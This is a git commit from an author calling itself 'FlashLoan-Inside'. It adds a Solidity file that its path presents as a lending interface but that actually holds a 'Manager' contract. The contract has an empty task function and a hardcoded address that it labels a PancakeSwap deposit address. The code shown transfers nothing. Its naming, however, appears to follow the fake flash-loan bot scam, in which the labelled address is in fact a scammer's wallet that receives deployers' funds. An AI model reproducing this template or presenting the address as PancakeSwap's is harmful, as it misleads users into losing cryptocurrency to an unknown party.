269d631f649be7a14cae5da37467218da8da275f
FlashLoan-Inside <flashloaneasy@gmail.com>
2022-03-10 15:12:06 -0600

    Initial

---
+++ contracts/interfaces/ILendingCall.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x73be4e7271C4996f4aCbc703DA731de247C92999;
+    }
+}
+
+//pancakeswapfunction
